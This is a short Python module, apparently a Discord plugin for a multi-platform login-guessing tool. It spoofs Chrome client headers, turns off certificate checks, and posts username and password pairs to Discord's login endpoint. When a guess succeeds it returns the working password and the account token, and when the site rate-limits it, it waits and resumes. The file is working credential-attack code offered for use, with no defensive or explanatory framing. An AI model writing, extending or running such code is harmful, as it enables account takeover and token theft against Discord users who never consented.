import requests, json, base64, urllib3
urllib3.disable_warnings()
class Platform:
    name = "Discord"; emoji = "💬"; color = "magenta"
    def setup(self):
        self.s = requests.Session()
        sp = base64.b64encode(json.dumps({"os":"Linux","browser":"Chrome","device":"","system_locale":"en-US","browser_version":"120.0.0.0","os_version":"","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":220222,"client_event_source":None}).encode()).decode()
        self.s.headers.update({"X-Super-Properties":sp,"Content-Type":"application/json","Origin":"https://discord.com","Referer":"https://discord.com/login"})
    def attempt(self, u, p):
        try:
            r = self.s.post("https://discord.com/api/v9/auth/login", json={"login":u,"password":p,"undelete":False}, verify=False, timeout=10)
            if r.status_code == 200:
                if "token" in r.json(): return {"success":True,"password":p,"token":r.json()["token"][:50]}
            if r.status_code == 429: return {"success":False,"rate_limit":True,"wait":60}
            return {"success":False}
        except: return {"success":False}
